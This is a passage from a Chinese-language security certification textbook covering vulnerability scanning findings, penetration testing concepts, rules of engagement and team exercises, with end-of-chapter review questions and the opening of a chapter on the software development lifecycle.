  \ 5.15 展示了此类扫描结果的示例。\n\n在该示例中，目标系统似乎是一个支持 ASP.NET 开发环境的 Windows 服务器。报告的输出部分显示，当客户端发送\
  \ DEBUG 请求时，服务器会做出响应。\n\n解决此问题需要开发人员配合，在面向公众的系统上禁用调试模式。在成熟的组织中，软件开发应始终在专用的开发环境中进行，该环境仅可从私有网络访问。应鼓励（或强制！）开发人员仅在专用于该目的的系统上进行测试，在这些服务器上启用调试模式完全合适。面向公众的系统无需支持此功能。\n\
  \n![图 5.15 调试模式漏洞](img/c05f015.png)\n\n**图 5.15** 调试模式漏洞\n\n#### 不安全协议\n\n互联网早期网络上使用的许多旧协议在设计时未考虑安全性。它们通常未能使用加密来保护用户名、密码以及通过开放网络发送的内容，使协议用户面临窃听攻击的风险。Telnet\
  \ 是一种用于获取远程服务器命令行访问权限的不安全协议示例。文件传输协议 (FTP) 提供了在系统间传输文件的能力，但不包含安全功能。图 5.16 展示了一个检测到支持不安全\
  \ FTP 协议的系统的扫描报告示例。\n\n解决此问题的方法是简单地切换到更安全的协议。幸运的是，Telnet 和 FTP 都存在加密替代方案。系统管理员在寻求获取远程系统命令行访问权限时，可以使用安全外壳协议\
  \ (SSH) 作为 Telnet 的安全替代品。同样，安全文件传输协议 (SFTP) 和 FTP-Secure (FTPS) 都提供了在系统间安全传输文件的方法。\n\
  \n![图 5.16 FTP 明文认证漏洞](img/c05f016.png)\n\n**图 5.16** FTP 明文认证漏洞\n\n#### 弱加密\n\n\
  加密是每个网络安全计划中用于保护存储数据和网络传输数据的关键安全控制。然而，与任何控制一样，加密必须安全配置才能提供充分的保护。你将在 第 7 章 “密码学和公钥基础设施”\
  \ 中了解更多关于安全实施加密的内容。\n\n当你实施加密时，需要做出两个重要选择：\n\n*   用于执行加密和解密的算法\n*   与该算法配合使用的加密密钥\n\
  \n你对这两个特性所做的选择可能对环境安全性产生深远影响。如果你使用弱加密算法，攻击者可能轻易攻破它。如果你选择的加密密钥因其长度或组成而易于猜测，攻击者可能通过密码学攻击找到它。例如，图\
  \ 5.17 显示了一份来自支持不安全 RC4 密码套件系统的扫描报告。\n\n![图 5.17 不安全的 SSL 密码套件漏洞](img/c05f017.png)\n\
  \n**图 5.17** 不安全的 SSL 密码套件漏洞\n\n### 渗透测试\n\n\n\n\n### 渗透测试\n\n*渗透测试*旨在弥合单纯使用技术工具测试组织安全性与将这些工具置于熟练且坚定的攻击者手中所发挥威力之间的差距。渗透测试是经过授权的、合法的尝试，旨在突破组织的安全控制并执行未授权活动。这些测试耗时较长，且要求员工具备与现实世界中企图攻陷组织的攻击者同等的技能和决心。然而，它们也是组织全面了解其安全漏洞的最有效途径。\n\
  \n#### 采用黑客思维\n\n在第 1 章“今日安全专业人员”中，你了解了 CIA 三要素，以及机密性、完整性和可用性这三大目标如何成为网络安全领域的核心。网络安全防御者确实将大部分时间花在基于这些术语的思考上，设计控制和防御措施，以保护信息和系统免受针对机密性、完整性和可用性的各种已知和未知威胁。\n\
  \n渗透测试人员在思维方式上必须采取截然不同的方法。他们不需要尝试防御所有可能的威胁，而只需找到一个可能被利用以达成目标的漏洞。为了发现这些缺陷，他们必须像现实世界中可能攻击系统的对手那样思考。这种方法通常被称为采用*黑客思维*。\n\
  \n在从技术系统角度探讨黑客思维之前，让我们先用一个物理世界的例子来探讨它。如果你负责一家电子产品商店的物理安全，你可能会考虑各种威胁，并实施旨在应对这些威胁的控制措施。你会担心商店行窃、抢劫和员工贪污等威胁，并可能建立一套安全控制体系，旨在防止这些威胁变为现实。这些控制措施可能包括：\n\
  \n- 高风险区域的安全摄像头\n- 收银机收据审计\n- 商店主出入口的防盗探测器\n- 紧急出口的出口警报\n- 连接门磁传感器的防盗报警器，用于检测营业时间外门被打开的情况\n\
  \n现在，假设你受聘对这家商店进行安全评估。你可能会检查这些安全控制措施中的每一项，并评估其防范初始风险评估中确定的各类威胁的能力。你还会寻找现有安全控制中的漏洞，这些漏洞可能需要补充措施。你的任务范围广泛且层级较高。\n\
  \n另一方面，渗透测试的任务则更加聚焦。你不采用安全专业人员的方法，而是采用攻击者的思维模式。你不需要评估这些安全控制措施中每一项的有效性。你只需找到现有控制中的一个缺陷，或规划这些控制时忽略的一个场景即可。\n\
  \n在本例中，渗透测试人员可能在营业时间进入商店进行侦察，收集现有安全控制措施和关键商品位置的信息。他们可能会注意到，虽然防盗报警器连接了门磁，但窗户上却没有安装任何传感器。测试人员随后可能在半夜返回，砸碎窗户，拿走贵重商品。考虑到商店安装了安全摄像头，攻击者可能会戴上面具，并将车辆停在摄像头拍摄范围之外。这就是黑客思维。你需要像罪犯一样思考。\n\
  \n还有一个重要的推论，对攻击者和防御者都至关重要。在进行渗透测试（或现实攻击）时，攻击者只需成功一次。他们可能会对目标尝试数百或数千次潜在攻击。如果其中一次攻击成功，那么组织的安全防御阻止了\
  \ 99.99% 攻击这一事实就无关紧要了。网络安全专业人员需要*每次*都赢；攻击者只需赢一次。\n\n#### 渗透测试的理由\n\n现代组织投入大量时间、精力和资金用于各种安全控制和活动。我们安装防火墙、入侵防御系统、安全信息和事件管理设备、漏洞扫描器以及许多其他工具。我们配备并安排人员值守\
  \ 24 小时安全运营中心（SOC），以监控这些技术并监视我们的系统、网络和应用程序是否有妥协迹象。工作量足以让我们忙碌两倍的时间。为什么我们还要承担执行渗透测试的额外负担？毕竟，内部执行非常耗时，外包又很昂贵。\n\
  \n答案在于渗透测试为我们提供了通过其他方式无法获得的组织安全态势可见性。渗透测试并不旨在取代组织的所有其他网络安全活动。相反，它补充并构建在这些工作之上。渗透测试人员带来其独特的技能和视角，能够获取安全工具的输出，并将其置于攻击者的思维框架中，提出这样一个问题：“如果我是攻击者，如何利用这些信息为我所用？”\n\
  \n#### 渗透测试的益处\n\n我们已经从宏观层面讨论了渗透测试人员*如何*开展工作，本书的其余部分将详细探讨渗透测试工具和技术。在深入探讨之前，让我们花点时间考虑*为什么*要进行渗透测试。它给组织带来了哪些益处？\n\
  \n首先，渗透测试为我们提供了无法从其他途径获得的知识。通过进行彻底的渗透测试，我们可以了解拥有与我们测试人员相同知识、技能和信息的攻击者，是否有可能突破我们的防御。如果他们无法立足，我们就可以合理地相信，在当前情况下，我们的网络能抵御同等水平攻击者的攻击。\n\
  \n其次，如果攻击者成功了，渗透测试会为我们提供一份重要的修复蓝图。网络安全专业人员可以追踪测试人员在攻击不同阶段的行动，并关闭测试人员通过的一系列“敞开的大门”。这为我们提供了针对未来攻击的更强健防御。\n\
  \n最后，渗透测试可以为我们提供关于特定攻击目标的重要、聚焦的信息。我们可能会在新系统部署前进行渗透测试，专门测试该新环境的安全功能。与开放式渗透测试的广泛性质不同，这些聚焦测试可以深入钻研特定目标周围的防御，提供可操作的见解，防止漏洞在初始暴露时就被利用。\n\
  \n#### 渗透测试类型\n\n确定评估类型后，关于渗透测试要决定的第一件事之一是测试人员将拥有多少关于环境的知识。通常使用三种典型分类来描述这一点：\n\n\
  \n\n\n#### 渗透测试类型\n\n*   **White-box** 测试，也称为 **known environment tests**，是在完全了解目标的底层技术、配置和设置的情况下进行的测试。测试人员通常拥有网络图、系统列表、IP\
  \ 网络范围，甚至目标系统的凭据等信息。White-box 测试允许在不需要测试人员花费时间识别目标和确定入口点的情况下，对系统进行有效测试。这意味着 White-box\
  \ 测试通常更完整，因为测试人员可以访问范围内的每个系统、服务或其他目标，并拥有允许其进行测试的凭据和其他材料。当然，由于测试人员可以看到环境内部的一切，他们可能无法提供外部攻击者视角的准确视图，且对大多数攻击者有效的控制措施可能会被绕过。\n\
  \n*   **Black-box** 测试，也称为 **unknown environment tests**，旨在复现攻击者会遇到的情况。测试人员不提供环境的访问权限或信息，而是必须收集信息、发现漏洞，并像攻击者一样穿越基础设施或系统。这种方法可能耗时较长，但有助于提供针对同等或较低技能攻击者的目标安全性的合理准确评估。重要的是要注意，进行\
  \ Black-box 渗透测试时，渗透测试人员或团队的质量和技能组合非常重要——如果预期针对贵组织的威胁行为体能力更强，Black-box 测试人员无法提供他们能做什么的现实视图。\n\
  \n*   **Gray-box** 测试，也称为 **partially known environment tests**，是 Black-box 和 White-box\
  \ 测试的混合。Gray-box 测试可能会向渗透测试人员提供一些关于环境的信息，但不给予完全访问权限、凭据或配置细节。Gray-box 测试有助于集中渗透测试人员的时间和精力，同时提供攻击者实际会遇到情况的更准确视图。\n\
  \n#### 交战规则\n\n一旦确定了评估类型和测试人员将拥有的目标知识水平，就可以编写其余的 **rules of engagement (RoE)**。关键要素包括：\n\
  \n*   **交战时间线及测试时段**。某些评估会故意安排在非关键时间段，以最大限度地减少潜在服务中断的影响；而其他评估可能安排在正常工作时间，以帮助测试组织对攻击的反应。\n\
  \n*   **包含或排除的目标范围**。包括位置、系统、应用程序或其他潜在目标。这通常还涉及关于可能受测试影响的第三方服务提供商的讨论，例如互联网服务提供商、软件即服务或其他云服务提供商，或外包安全监控服务。任何特殊的技术限制也应在\
  \ RoE 中讨论。\n\n*   **渗透测试期间收集信息的数据处理要求**。当交战涵盖敏感组织数据或系统时，这一点尤为重要。处理要求通常包括对调查结果的保密要求，例如测试期间和测试后加密数据，以及交战结束后处置渗透测试数据和结果的合同要求。\n\
  \n*   **目标的预期防御行为**。像 shunning、blacklisting 或其他主动防御等防御行为可能会限制渗透测试的价值。如果测试旨在评估防御，这可能很有用。如果测试旨在测试完整的基础设施，shunning\
  \ 或阻止渗透测试团队的工作会浪费时间和资源。\n\n*   **投入测试的资源**。在 White-box 和 Gray-box 测试场景中，来自目标系统管理员、开发人员和其他专家的时间投入不仅有用，而且对于有效测试可能是必要的。\n\
  \n*   **法律顾虑**。包括审查涵盖目标组织、任何远程位置以及任何将在范围内的服务提供商的法律。\n\n*   **沟通时间和方式**。 交战是否应包含无论进度如何的每日或每周更新，还是渗透测试人员仅在完成工作时报告？如果他们发现当前妥协的证据，测试人员应如何响应？\n\
  \n范围协议和交战规则必须定义的不仅仅是将测试什么。事实上，记录测试的局限性与记录将包含的内容同样重要。测试协议或范围文档应包含免责声明，说明测试仅在其进行的时间点有效，且所选范围和方法会影响测试的全面性。毕竟，White-box\
  \ 渗透测试比对保护良好的系统进行 Black-box 测试更有可能发现设计深层的问题！\n\n问题处理和解决是交战规则的另一个关键要素。虽然渗透测试人员和客户总希望测试顺利进行且不会造成任何中断，但测试系统和服务，特别是在使用实际攻击和利用工具的生产环境中，可能会导致中断和其他问题。在这种情况下，在交战双方拥有明确定义的沟通、通知和升级路径，有助于最大限度地减少目标组织的停机时间和其他问题。渗透测试人员应仔细记录其职责和责任限制，并确保客户知道可能出现的问题，双方就如何处理达成一致。这样，测试的已知和未知影响都能得到适当处理。\n\
  \n####### 侦察\n\n渗透测试从 **reconnaissance** 阶段开始，测试人员寻求收集关于目标组织的尽可能多的信息。在 White-box\
  \ 测试中，测试人员带着大量知识开始演练，但他们仍寻求用额外技术补充这些知识。\n\n**Passive reconnaissance** 技术旨在不直接与目标交互的情况下收集信息。第\
  \ 2 章 “Cybersecurity Threat Landscape” 涵盖了多种适合被动侦察类别的开源情报 (OSINT) 技术。\n\n**Active\
  \ reconnaissance** 技术直接与目标交互以收集情报。这些技术包括使用 **port scanning** 识别系统上的开放端口、**footprinting**\
  \ 识别正在使用的操作系统和应用程序，以及 **vulnerability scanning** 识别可利用的漏洞。\n\n渗透测试人员的一个常见目标是识别可能提供访问目标内部网络途径而无需物理访问设施的无线网络。测试人员使用一种称为\
  \ **war driving** 的技术，他们驾驶配备高端天线的汽车经过设施，尝试窃听或连接无线网络。最近，测试人员已将这种方法扩展到使用无人机和无人驾驶飞行器\
  \ (UAV)，这种技术称为 **war flying**。\n\n#### 运行测试\n\n在渗透测试期间，测试人员遵循攻击者使用的相同流程。您将在 第 14\
  \ 章 “Incident Response” 中关于 Cyber Kill Chain 的讨论中了解更多关于此流程的信息。然而，在准备考试时，您应该熟悉测试的一些关键阶段：\n\
  \n\n\n\n\n### 安全评估与测试\n\n#### 攻击阶段\n\n*   **初始访问**是指攻击者利用漏洞获取对组织网络的访问权限。\n*   **权限提升**使用黑客技术将攻击者获得的初始访问权限转变为更高级的权限，例如在同一系统上的\
  \ root 访问权限。\n*   **跳板攻击**，或**横向移动**，是指攻击者利用初始系统的沦陷来获取对目标网络上其他系统的访问权限。\n*   攻击者通过安装后门和使用其他机制在被攻陷的网络上建立**持久性**，这些机制将允许他们重新获得对网络的访问权限，即使最初的漏洞已被修补。\n\
  \n#### 利用框架\n\n渗透测试人员在执行工作时会使用许多真实攻击者使用的相同工具。**利用框架**（如 Metasploit）通过提供模块化的方法来配置和部署漏洞利用代码，简化了漏洞的利用过程。\n\
  \n#### 清理工作\n\n渗透测试结束时，测试人员会执行收尾活动，包括向管理层汇报结果并清理其工作留下的痕迹。测试人员应移除其安装在系统上的任何工具以及其建立的任何持久性机制。收尾报告应向目标方详细说明测试期间发现的漏洞，并就改善组织网络安全态势提供建议。\n\
  \n#### 培训与演练\n\n组织开展各种培训计划，旨在帮助员工了解其在网络安全方面的角色。网络安全分析师经常参加以竞赛形式设置的演练类培训计划，让一支攻击团队对抗一支防御团队。\n\
  \n开展演练有助于识别组织系统、网络和应用程序中的漏洞，其效果类似于渗透测试的结果。演练还为员工提供了攻击和防御系统的实战经验。这有助于提升技术人员的网络安全技能和意识。\n\
  \n进行演练时，参与者通常分为三组：\n\n*   **红队**成员是攻击者，他们尝试获取对系统的访问权限。\n*   **蓝队**成员是防御者，他们必须保护系统和网络免受攻击。蓝队在演练期间还会监控环境，实施主动防御技术。蓝队通常会获得先发优势，在演练攻击阶段开始前拥有一些时间来加固系统。\n\
  *   **白队**成员是观察员和裁判。他们作为仲裁员解决关于规则的争议，并观察演练以记录测试中的经验教训。白队能够观察红队和蓝队双方的活动，还负责确保演练不会导致生产环境问题。\n\
  \n##### 夺旗 (CTF) 演练\n\n夺旗 (CTF) 演练是实现培训目标的一种有趣方式。在 CTF 演练中，红队从设定的目标开始，例如破坏网站、从安全系统中窃取文件或导致其他安全故障。演练根据红队达成的目标数量与蓝队阻止其执行的目标数量进行评分。\n\
  \n##### 演练环境\n\n演练不必使用生产系统。在许多情况下，组织可能会专门为演练目的搭建一个特殊环境。这为测试提供了一个安全的沙箱，并最大限度地降低了攻击破坏生产系统的可能性。其他演练甚至可能完全不使用真实系统。**桌面推演**只是将参与者聚集在同一房间，演练他们对�构场景的响应。\n\
  \n### 总结\n\n安全评估与测试在网络安全计划的持续管理中发挥着至关重要的作用。本章讨论的技术有助于网络安全专业人员维护有效的安全控制，并及时了解可能改变其安全态势的环境变化。\n\
  \n漏洞扫描可识别系统、应用程序和设备中潜在的安全问题，使团队能够在攻击者利用这些问题之前进行修复。这些扫描期间可能检测到的漏洞包括补丁管理不当、弱配置、默认账户以及不安全协议和密码的使用。\n\
  \n渗透测试让安全专业人员扮演攻击者的角色，要求他们对目标发起进攻性行动，以发现安全问题。渗透测试的结果为改进安全控制提供了路线图。\n\n### 考试要点\n\
  \n**现代计算环境中存在许多漏洞。** 网络安全专业人员应时刻关注本地部署和云环境中漏洞带来的风险。不当或薄弱的补丁管理可能是许多漏洞的根源，为攻击者提供了利用操作系统、应用程序和固件的路径。造成漏洞的弱配置设置包括开放权限、不安全的\
  \ root 账户、错误、弱加密设置、不安全协议使用、默认设置以及开放的端口和服务。当扫描检测到一个并不存在的漏洞时，该报告称为**误报**。当扫描未能检测到实际存在的漏洞时，该报告称为**漏报**。\n\
  \n**威胁狩猎发现现有的妥协/沦陷。** 威胁狩猎活动假定组织已经遭到入侵，并搜寻这些入侵的指标。威胁狩猎工作包括在情报融合计划中使用通告、公告和威胁情报源。它们搜寻攻击者获取网络初始访问权限，随后在该网络上进行机动活动的迹象。\n\
  \n**漏洞扫描探测系统、应用程序和设备中的已知安全问题。** 漏洞扫描利用应用程序、网络和 Web 应用程序测试来检查已知问题。这些扫描可以采用有凭据或无凭据的方式进行，根据组织需求可以是侵入式或非侵入式的。审查扫描的分析师还应审查日志和配置以获取额外上下文。漏洞使用通用漏洞披露\
  \ (CVE) 标准进行一致性描述，并使用通用漏洞评分系统 (CVSS) 进行评级。\n\n**渗透测试让安全专业人员扮演攻击者的角色。** 渗透测试可以采用测试前向测试人员提供完全信息（白盒）、完全不提供信息（黑盒）或介于两者之间（灰盒）的方式进行。测试人员在交战规则范围内进行测试，通常从侦察工作开始，包括无线网络侦察、无人机侦察、足迹采集和开源情报\
  \ (OSINT)。他们利用这些信息获取对系统的初始访问权限。随后，他们寻求实施权限提升以提高访问级别，并通过横向移动/跳板攻击扩大对其他系统的访问范围。他们力求实现持久性，以便在最初利用的漏洞被修补后仍能保持访问权限。测试结束时，他们执行清理活动以将系统恢复正常工作秩序并清除其活动痕迹。\n\
  \n\n\n\n\n**漏洞赏金计划激励漏洞上报。** 漏洞赏金计划允许外部安全专业人员探测组织面向公众的系统的安全性。发现漏洞的测试人员将因其参与而获得经济奖励。这种方法是激励黑客为正义而工作、而不是利用发现的漏洞攻击目标的好途径。\n\
  \n**网络安全演练确保团队为安全事件做好准备。** 演练旨在测试安全专业人员的技能。蓝队负责管理组织的防御。红队使用进攻性黑客技术，尝试获取目标网络上系统的访问权限。白队充当演练的中立主持人。紫队演练在演练后进行，旨在将红队和蓝队聚集在一起进行知识共享。\n\
  \n### 复习题\n\n1. 以下哪种安全评估技术假设组织已被攻陷，并搜索该攻陷的证据？\n\n    1. 漏洞扫描\n    2. 渗透测试\n    3.\
  \ 威胁狩猎\n    4. 战争驾驶\n\n2. Renee 正在配置她的漏洞管理解决方案，以对网络上的服务器执行凭证扫描。她应该向扫描器提供哪种类型的账户？\n\
  \n    1. 域管理员\n    2. 本地管理员\n    3. Root\n    4. 只读\n\n3. Ryan 计划使用危险插件对业务关键系统进行漏洞扫描。初始扫描的最佳方法是什么？\n\
  \n    1. 在生产系统上运行扫描，以获得尽可能真实的结果。\n    2. 在工作时间运行扫描。\n    3. 在测试环境中运行扫描。\n    4.\
  \ 不运行扫描，以免干扰业务。\n\n4. 以下哪个 CVSS 攻击复杂度指标值表明特定攻击最容易被利用？\n\n    1. 高\n    2. 中\n  \
  \  3. 低\n    4. 严重\n\n5. Tara 最近分析漏洞扫描报告结果时发现，扫描器报告的一个漏洞并不存在，因为系统实际上已按规定打补丁。发生了哪种类型的错误？\n\
  \n    1. 误报\n    2. 漏报\n    3. 真阳性\n    4. 真阴性\n\n6. Brian 对学校的评分系统进行了渗透测试，发现了一个缺陷，该缺陷允许学生通过利用\
  \ SQL 注入漏洞来篡改成绩。他应该向学校的网络安全团队推荐哪种类型的控制，以防止学生从事此类活动？\n\n    1. 机密性\n    2. 完整性\n\
  \    3. 篡改\n    4. 可用性\n\n7. 以下哪种安全评估工具最不可能在渗透测试的侦察阶段使用？\n\n    1. Nmap\n    2.\
  \ Nessus\n    3. Metasploit\n    4. Nslookup\n\n8. 在漏洞扫描期间，Brian 发现其网络上的一个系统包含此漏洞：\n\
  \n    ![](img/c05uf001.png)\n\n    如果部署了哪种安全控制，可能会解决此问题？\n\n    1. 补丁管理\n    2.\
  \ 文件完整性监控\n    3. 入侵检测\n    4. 威胁狩猎\n\n9. 以下哪种工具最有可能检测到 XSS 漏洞？\n\n    1. 静态应用程序测试\n\
  \    2. Web 应用程序漏洞扫描器\n    3. 入侵检测系统\n    4. 网络漏洞扫描器\n\n10. 在渗透测试期间，Patrick 在受损系统上部署了一个工具包，并利用它访问同一网络上的其他系统。哪个术语最能描述此活动？\n\
  \n     1. 横向移动\n     2. 权限提升\n     3. 足迹\n     4. OSINT\n\n11. Kevin 正在参加其组织的安全演练。他在演练中的角色是使用黑客技术尝试获取组织系统的访问权限。Kevin\
  \ 在此演练中扮演什么角色？\n\n     1. 红队\n     2. 蓝队\n     3. 紫队\n     4. 白队\n\n12. 以下哪种评估技术旨在征求外部安全专家的参与，并奖励他们发现漏洞？\n\
  \n     1. 威胁狩猎\n     2. 渗透测试\n     3. 漏洞赏金\n     4. 漏洞扫描\n\n13. Kyle 正在进行渗透测试。在获得组织数据库服务器的访问权限后，他在服务器上安装了一个后门，以便将来自己能够访问。哪个术语最能描述此行为？\n\
  \n     1. 权限提升\n     2. 横向移动\n     3. 机动\n     4. 持久化\n\n14. 以下哪种技术会被视为被动侦察？\n\n\
  \     1. 端口扫描\n     2. 漏洞扫描\n     3. WHOIS 查询\n     4. 足迹\n\n15. SCAP 框架的哪个元素可用于一致地描述漏洞？\n\
  \n     1. CPE\n     2. CVE\n     3. CVSS\n     4. CCE\n\n16. Bruce 正在为客户进行渗透测试。客户提前向他提供了其系统的详细信息。Bruce\
  \ 正在进行哪种类型的测试？\n\n     1. 灰盒测试\n     2. 蓝盒测试\n     3. 白盒测试\n     4. 黑盒测试\n\n17.\
  \ Lila 正在渗透测试团队工作，她不确定是否被允许将社会工程学作为测试的一部分。她应该查阅哪份文件以获取此信息？\n\n     1. 合同\n     2.\
  \ 工作说明书\n     3. 交战规则\n     4. 经验教训报告\n\n18. Grace 想要确定她在渗透测试中针对的目标系统上运行的操作系统。以下哪种技术能最直接地为她提供此信息？\n\
  \n     1. 端口扫描\n     2. 足迹\n     3. 漏洞扫描\n     4. 报文捕获\n\n19. Kevin 最近发现了一个新的安全漏洞，并计算其\
  \ CVSS 基础分值为 6.5。该漏洞属于哪个风险类别？\n\n     1. 低\n     2. 中\n     3. 高\n     4. 严重\n\n\
  20. 以下哪个 CVSS 指标包含有关攻击者执行攻击所需的账户访问类型的信息？\n\n     1. AV\n     2. C\n     3. PR\n\
  \     4. AC\n\nWileyPRE\n\n## 第 6 章\n\n安全编码\n\n软件无处不在，从面向客户的应用程序和服务到较小的程序，再到为支持业务需求而编写的最小自定义脚本。设计、创建、支持和维护该软件的过程称为软件开发生命周期（`SDLC`）。作为安全从业者，您需要了解\
  \ `SDLC` 及其安全影响，以确保组织使用的软件在其整个生命周期内编写良好且安全。\n\n在本章中，您将了解主要的软件开发生命周期模型及其选择原因，示例包括瀑布模型和螺旋模型以及敏捷开发方法。接下来，您将回顾软件开发安全最佳实践和安全软件编码指南。作为其中的一部分，您将回顾软件如何被测试和审查，以及这些流程如何融入\
  \ `SDLC`。\n\n最后，您将了解软件中常见的漏洞，包括客户端-服务器和基于 Web 的应用程序。您将学习如何识别和防御软件安全漏洞利用。\n\n###\
  \ 软件保障最佳实践\n\n构建、部署和维护软件需要在整个软件生命周期中都有安全参与。安全软件开发生命周期包括在软件开发过程的每个阶段纳入安全关注点。\n\n\n\
  \n\n\n#### 软件开发生命周期\n\n软件开发生命周期（SDLC）描述了软件在其整个生命周期中开发模型的步骤。如图 6.1 所示，它描绘了软件创建的全过程：从构想到需求收集与分析，再到设计、编码、测试和发布。一旦软件投入生产，还包括用户培训、维护，以及在软件包生命周期结束时的退役处理。\n\
  \n软件开发并不总是遵循正式模型，但大多数针对主要应用的企业级开发都会遵循这些阶段中的大部分，如果不是全部的话。在某些情况下，开发人员甚至可能在不知不觉中使用了\
  \ SDLC 模型的某些要素！\n\nSDLC 对组织和开发人员都很有用，因为它提供了一个一致的框架来构建工作流，并为开发过程提供规划。尽管有这些优势，仅仅选择一个\
  \ SDLC 模型来实施并不总是最佳选择。每种 SDLC 模型都更适合特定类型的工作和项目，因此选择一个适合工作的 SDLC 模型是该过程的重要组成部分。\n\n\
  ![FIGURE 6.1 High-level SDLC view](img/c06f001.png)\n\n**图 6.1** 高层 SDLC 视图\n\n\
  #### 软件开发阶段\n\n无论您的组织选择哪种 SDLC 或流程，大多数 SDLC 模型中都会出现以下几个阶段：\n\n1.  **可行性**阶段是对该工作是否应该开展进行初步调查的阶段。可行性研究还会审视替代方案以及每个提议方案的高层成本。其结果是一份包含后续计划的建议书。\n\
  \n2.  一旦某项工作被认定为可行，通常会进入**分析与需求定义**阶段。在此阶段，会征求客户意见以确定期望的功能、当前系统或应用程序的现有功能与缺失功能，以及期望的改进。需求可按优先级排序，以确定哪些对项目成功最为关键。\n\
  \n3.  **设计**阶段包括功能设计、架构设计、集成点与技术、数据流、业务流程，以及任何其他需要设计考量的要素。\n\n4.  应用程序的实际编码发生在**开发**阶段。此阶段可能涉及软件部分的测试，包括**单元测试**，即单独测试小型组件以确保其正常运行。\n\
  \n5.  虽然开发阶段可能会进行一些测试，但正式测试（由客户或开发团队外部人员参与）发生在**测试与集成**阶段。各个单元或软件组件被集成并测试，以确保功能正常。此外，与外部服务、数据源和其他集成的连接也可能在此阶段进行。在此期间会进行**用户验收测试**（UAT），以确保软件用户对其功能感到满意。\n\
  \n6.  确保最终用户接受软件培训并使软件投入普遍使用这一重要任务发生在**培训与过渡**阶段。此阶段有时被称为验收、安装和部署阶段。\n\n7.  项目完成后，应用程序或服务将进入通常持续时间最长的阶段：**持续运营与维护**。此阶段包括补丁管理、更新、小型修改以及日常支持所涉及的其他工作。\n\
  \n8.  当产品或系统达到其生命周期末期时，会发生**处置**阶段。尽管在开发新产品的热潮中处置阶段常被忽视，但它之所以重要有多方面原因：关闭旧产品可节省成本，替换现有工具可能需要特定知识或额外工作，且数据和系统可能需要被保存或妥善处置。\n\
  \n阶段的顺序可能有所不同，有的简单线性推进，有的采取迭代或并行方法。在成功的软件生命周期中，您仍会看到这些阶段的某种形式。\n\n#### 软件开发模型\n\n\
  SDLC 可以通过多种方式实施，随着时间的推移，创建了许多正式模型来帮助为开发提供通用框架。正式 SDLC 模型可以非常详细，包含特定的实践、程序和文档，但许多组织会选择一个或多个模型中最适合其组织风格、工作流和需求的要素。\n\
  \n##### 瀑布模型\n\n**瀑布**方法论是一种顺序模型，其中每个阶段后面紧跟下一个阶段。各阶段不重叠，且每个阶段在逻辑上通向下一个。图 6.2 展示了一个典型的六阶段瀑布流程。第\
  \ 1 阶段收集并记录需求。第 2 阶段涉及旨在构建业务规则和模型的分析。第 3 阶段设计软件架构，第 4 阶段进行软件的编码和集成。软件完成后进入第 5 阶段，完成测试和调试。最后软件进入运营阶段，持续进行支持、维护和其他运营活动。\n\
  \n在许多组织中，瀑布模型已被取代，因为它被视为相对缺乏灵活性，但它仍用于复杂系统。由于瀑布模型对变更响应不高，且不考虑内部迭代工作，因此通常建议将其用于涉及固定范围、已知交付时间框架，并使用稳定、成熟技术平台的开发工作。\n\
  \n### 螺旋模型\n\n**螺旋**模型采用了瀑布模型的线性开发概念，并增加了一个迭代过程，在开发生命周期中多次重访四个阶段，以收集更详细的需求、根据需求设计功能、并基于设计进行构建。此外，螺旋模型将风险评估作为\
  \ SDLC 的重要组成部分，在开发过程中多次审查风险。\n\n![FIGURE 6.2 The Waterfall SDLC model](img/c06f002.png)\n\
  \n**图 6.2** 瀑布 SDLC 模型\n\n图 6.3 所示的螺旋模型使用四个阶段，并在整个开发生命周期中反复访问它们：\n\n1.  识别，即需求收集，最初收集业务需求、系统需求，随着过程继续，收集子系统或模块的更详细需求。\n\
  \n2.  设计，包括概念设计、架构设计、逻辑设计，有时还包括物理或最终设计。\n\n3.  构建，产出初步的概念验证，随后产出进一步的开发版本，直到生成最终的生产版本。\n\
  \n4.  评估，涉及开发项目的风险分析，旨在从技术和管理角度监控软件交付的可行性。随着开发周期继续，此阶段还涉及客户测试和反馈，以确保客户验收。\n\n螺旋模型提供了更大的灵活性来应对需求变更以及外部影响，如客户反馈和开发人员的可用性。它还允许软件开发生命周期比瀑布模型更早地启动。因为螺旋模型会重访其过程，所以该模型可能导致返工，或在过程后期识别出由于更详细需求浮现而需要重大设计变更的设计需求。\n\
  \n![FIGURE 6.3 The Spiral SDLC model](img/c06f003.png)\n\n**图 6.3** 螺旋 SDLC 模型\n\
  \n\n\n\n\n##### 敏捷开发\n\n**敏捷**软件开发是一个迭代和增量的过程，而不是瀑布模型和螺旋模型所采用的线性过程。敏捷植根于《敏捷软件开发宣言》，该文档包含四个基本前提：\n\
  \n*   个体和互动胜过流程和工具。\n*   可工作的软件胜过详尽的文档。\n*   客户合作胜过合同谈判。\n*   响应变化胜过遵循计划。\n\n如果你习惯了瀑布或螺旋开发流程，敏捷将显著区别于敏捷前辈们所采用的以规划、设计和文档为中心的方法。敏捷方法倾向于将工作拆分为更小的单元，从而使工作能够更快完成，并减少前期规划。它专注于适应需求，而非预测需求，主要里程碑在流程早期确定，但随着项目的持续开发可能会发生变化。\n\
  \n工作通常被分解为称为**冲刺**的短时工作会话，持续时间可以从几天到几周不等。图 6.4 展示了一个包含多个冲刺的敏捷项目方法论的简化视图。当开发人员和客户同意任务完成，或分配给冲刺的时间用完时，开发工作即告完成。\n\
  \n![图 6.4 敏捷冲刺](img/c06f004.png)\n\n**图 6.4** 敏捷冲刺\n\n敏捷方法论基于 12 条原则：\n\n*   通过早期且持续地交付软件，确保客户满意。\n\
  *   欢迎需求变更，即使是在开发后期。\n*   频繁交付可工作的软件（以周为单位，而非月）。\n*   确保开发人员与业务人员之间每天的合作。\n*   项目应围绕有动力的个体构建，给予他们所需的支持、信任和环境以取得成功。\n\
  *   面对面交谈是向开发团队内部传递信息的最高效方式。\n*   以可工作的软件作为进度的主要度量标准。\n*   开发应保持可持续的步调，能够持续维持。\n\
  *   持续关注技术卓越和良好设计。\n*   简洁性——即最大化未完成工作量的艺术——至关重要。\n*   最佳架构、需求和设计源自自组织团队。\n*   团队应定期反思如何提高效率，并相应地调整行为。\n\
  \n这些原则驱动了一种 SDLC 流程，其正式结构不如螺旋模型或瀑布模型严谨，但提供了许多客户反馈和修订的机会。它能更灵活地应对问题，并通常允许更快的客户反馈——这在发现安全问题时是一大优势。\n\
  \n##### DevSecOps 和 DevOps\n\n**DevOps** 将软件开发和 IT 运维相结合，旨在优化 SDLC。这是通过使用称为**工具链**的工具集合来实现的，旨在改进软件开发生命周期中的编码、构建和测试、打包、发布、配置和配置管理以及监控等环节。\n\
